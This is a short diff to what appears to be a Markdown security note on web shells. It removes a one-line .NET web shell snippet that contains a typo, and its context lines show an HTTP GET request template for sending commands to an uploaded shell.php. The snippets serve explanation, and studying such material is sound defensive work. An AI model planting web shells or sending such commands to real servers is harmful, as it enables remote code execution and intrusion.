@@ -50,11 +50,6 @@ A malicious script that enables attackers to execute commands on a web server th
 ```
 Where `command` is the parameter of the `GET` request being sent to the location where the shell was uploaded.
 
-- `.NET` application web shell that works the same way.
-```
-<% eval reque('cmd') %>
-```
-
 * One way of connecting to a web shell.
 ```
 GET /url/shell.php?command=<command_here> HTTP/1.1
